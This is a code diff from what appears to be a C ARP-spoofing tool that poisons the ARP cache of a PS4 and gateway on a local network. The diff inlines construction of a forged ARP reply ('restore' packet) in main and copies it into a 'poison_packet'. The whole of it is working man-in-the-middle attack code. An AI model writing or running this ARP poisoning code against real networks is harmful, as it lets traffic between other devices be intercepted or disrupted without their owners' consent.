@@ -21,22 +21,6 @@ ARPPacket_t poison_packet;
 ARPPacket_t restore_packet;
 int poison = 0; //determine if we should currently poison
 
-void fillARPPacket(ARPPacket_t *packet, const mac_address_t interface_mac, const Machine_t *dst_machine, const Machine_t *src_machine) {
-	memcpy(packet->eth.dst, dst_machine->mac, sizeof(packet->eth.dst));
-	memcpy(packet->eth.src, interface_mac, sizeof(packet->eth.src));
-	packet->eth.ethertype = htons(0x0806);
-
-	packet->arp.htype = htons(0x0001);
-	packet->arp.ptype = htons(0x0800);
-	packet->arp.hlen = sizeof(src_machine->mac);
-	packet->arp.plen = sizeof(src_machine->ip);
-	packet->arp.op = htons(ARPOP_REQUEST);
-	memcpy(packet->arp.src_mac, src_machine->mac, sizeof(packet->arp.src_mac));
-	memcpy(packet->arp.src_ip, src_machine->ip, sizeof(packet->arp.src_ip));
-	memcpy(packet->arp.dst_mac, dst_machine->mac, sizeof(packet->arp.dst_mac));
-	memcpy(packet->arp.dst_ip, dst_machine->ip, sizeof(packet->arp.dst_ip));
-}
-
 void printMac(const mac_address_t mac_array) {
 	printf("%02x", mac_array[0]);
 	for(int i = 1; i < 6; i++) printf(":%02x", mac_array[i]);
@@ -184,7 +168,20 @@ int main() {
 	printMachineInfo("Gateway", &src_machine);
 	printMachineInfo("PS4", &dst_machine);
 
-	fillARPPacket(&restore_packet, this_machine.mac, &dst_machine, &src_machine);
+	//fill restore packet with real values
+	memcpy(restore_packet.eth.dst, dst_machine.mac, sizeof(mac_address_t));
+	memcpy(restore_packet.eth.src, this_machine.mac, sizeof(mac_address_t));
+	restore_packet.eth.ethertype = htons(0x0806);
+
+	restore_packet.arp.htype = htons(0x0001);
+	restore_packet.arp.ptype = htons(0x0800);
+	restore_packet.arp.hlen = sizeof(mac_address_t);
+	restore_packet.arp.plen = sizeof(ip_address_t);
+	restore_packet.arp.op = htons(ARPOP_REPLY);
+	memcpy(restore_packet.arp.src_mac, src_machine.mac, sizeof(mac_address_t));
+	memcpy(restore_packet.arp.src_ip, src_machine.ip, sizeof(ip_address_t));
+	memcpy(restore_packet.arp.dst_mac, dst_machine.mac, sizeof(mac_address_t));
+	memcpy(restore_packet.arp.dst_ip, dst_machine.ip, sizeof(ip_address_t));
 
 	//fill poison packet
 	memcpy(&poison_packet, &restore_packet, sizeof(poison_packet));
